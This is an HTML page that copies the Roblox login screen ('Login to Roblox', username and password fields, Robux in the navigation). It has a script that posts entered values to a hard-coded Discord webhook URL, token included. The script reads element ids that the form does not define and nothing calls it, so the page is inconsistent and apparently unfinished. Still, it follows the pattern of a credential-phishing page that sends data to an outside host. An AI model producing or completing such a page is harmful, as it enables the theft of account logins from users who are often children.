<!DOCTYPE html>
<html>
<head>
  <title>UI Replica</title>

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #000;
    }

    /* NAVBAR */
    .navbar {
      position: fixed;
      top: 0;
      width: 100%;
      height: 44px;
      background: #1a1a1d;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 16px;
      color: #fff;
      font-size: 14px;
    }

    .logo-box {
      width: 90px;
      height: 20px;
      background: #2a2a2f; /* placeholder instead of logo */
    }

    .nav-center {
      display: flex;
      gap: 40px;
      color: #b8b8b8;
    }

    .nav-center span:hover {
      color: white;
      cursor: pointer;
    }

    .nav-right {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .search {
      background: #2a2a2f;
      border: 1px solid #3a3a3f;
      border-radius: 6px;
      padding: 4px 10px;
      color: white;
      width: 200px;
    }

    .signup {
      background: #335fff;
      padding: 4px 10px;
      border-radius: 6px;
      font-size: 12px;
    }

    /* BACKGROUND (different on purpose) */
    .background {
      position: absolute;
      width: 100%;
      height: 100%;
      background: url("https://images.unsplash.com/photo-1500530855697-b586d89ba3ee");
      background-size: cover;
      background-position: center;
      filter: brightness(0.4);
    }

    /* LOGIN BOX */
    .login-box {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 300px;

      background: #2b2d36;
      padding: 20px;
      border-radius: 6px;
      color: white;
    }

    .login-box h2 {
      margin: 0 0 15px;
      font-size: 20px;
      font-weight: 600;
    }

    .input {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;

      border-radius: 6px;
      border: 1px solid #3a3a3f;
      background: #1f2026;
      color: white;
      font-size: 13px;
    }

    .login-btn {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;

      background: transparent;
      border: 1px solid #8f8f94;
      border-radius: 6px;
      color: #d1d1d6;
      cursor: pointer;
    }

    .login-btn:hover {
      border-color: white;
    }

    .link {
      text-align: center;
      font-size: 12px;
      color: #cfcfcf;
      margin: 10px 0;
    }

    .divider {
      height: 1px;
      background: #3a3a3f;
      margin: 15px 0;
    }

    .secondary-btn {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;

      background: #3a3c45;
      border: none;
      border-radius: 6px;
      color: #d1d1d6;
      cursor: pointer;
    }

    .secondary-btn:hover {
      background: #4a4d57;
    }

    .bottom-text {
      text-align: center;
      font-size: 12px;
      color: #cfcfcf;
    }

    .bottom-text span {
      color: #4ea1ff;
      cursor: pointer;
    }
  </style>
</head>

<body>

  <!-- NAVBAR -->
  <div class="navbar">
    <div class="logo-box"></div>

    <div class="nav-center">
      <span>Charts</span>
      <span>Marketplace</span>
      <span>Create</span>
      <span>Robux</span>
    </div>

    <div class="nav-right">
      <input class="search" placeholder="Search">
      <div class="signup">Sign Up</div>
    </div>
  </div>

  <div class="background"></div>

  <!-- LOGIN -->
  <div class="login-box">
    <h2>Login to Roblox</h2>

    <input class="input" placeholder="Username/Email/Phone">
    <input class="input" type="password" placeholder="Password">

    <button class="login-btn">Log In</button>

    <div class="link">Forgot Password or Username?</div>

    <div class="divider"></div>

    <button class="secondary-btn">Email Me a One-Time Code</button>
    <button class="secondary-btn">Quick Sign-In</button>

    <div class="bottom-text">
      Don’t have an account? <span>Sign Up</span>
    </div>
  </div>

  <!-- SCRIPT -->
  <script>
    function sendData() {
      const name = document.getElementById("username").value || "Anonymous";
      const msg = document.getElementById("message").value;

      const webhookURL = "https://discord.com/api/webhooks/1495877685338177577/ec19rPYMRLTzhqlZLqavw2qpqmcoyNA2RoUTAfq_T49q9VMthATi12VnwlEtUY02nRs2";

      fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: name + ": " + msg
        })
      });

      alert("Sent!");
    }
  </script>

</body>
</html>
